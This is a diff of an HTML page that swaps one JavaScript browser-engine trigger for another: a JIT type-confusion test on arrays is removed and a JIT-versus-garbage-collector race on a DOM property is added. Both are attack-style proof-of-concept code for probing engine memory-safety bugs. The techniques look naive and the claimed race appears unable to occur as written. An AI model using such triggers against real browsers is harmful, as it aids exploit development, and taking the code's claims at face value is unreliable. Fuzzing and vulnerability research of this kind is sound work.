@@ -1,33 +1,35 @@
 <!DOCTYPE html>
+<div id="target"></div>
 <script>
-  function triggerGhostArray() {
-    // Step 1: Create a floating-point array
-    let arr = [1.1, 2.2, 3.3, 4.4];
-    
-    // Step 2: Force JIT optimization
-    function confuse(x, callback) {
-      let v = x[0];  // JIT assumes 'x' is always Float64
-      callback();     // Side effect: Swap array type
-      return v + x[1]; // Potential type confusion
-    }
+  // Step 1: Create a vulnerable object
+  let leakObj = {a: 0x41414141};
+  document.getElementById("target").__proto__.evil = leakObj;
 
-    // Step 3: Callback swaps 'arr' to an object array
-    function evil() {
-      arr[0] = {};   // Corrupt type assumption
-    }
-
-    // Step 4: Warm up JIT
-    for (let i = 0; i < 100000; i++) {
-      confuse(arr, () => {});
-    }
-
-    // Step 5: Trigger confusion
-    let result = confuse(arr, evil);
-    console.log("[!] Result:", result); // Check for NaN/crash
-    return result;
+  // Step 2: Force JIT compilation of a DOM accessor
+  function triggerRace() {
+    let x = document.getElementById("target").evil;
+    return x.a; // JIT assumes 'evil' is stable
   }
 
-  // Run test
-  let res = triggerGhostArray();
-  document.write("Test completed. Result: " + res);
+  // Step 3: Warm up JIT (monomorphic call)
+  for (let i = 0; i < 100000; i++) {
+    triggerRace();
+  }
+
+  // Step 4: Trigger GC during JIT execution
+  function forceGC() {
+    let tmp = [];
+    for (let i = 0; i < 1e6; i++) {
+      tmp.push(new ArrayBuffer(0x1000));
+    }
+  }
+
+  // Step 5: Race JIT vs. GC
+  setTimeout(() => {
+    let res = triggerRace();
+    console.log("[!] Race result:", res);
+    document.write("Race result: " + res);
+  }, 0);
+
+  forceGC(); // Contention point
 </script>
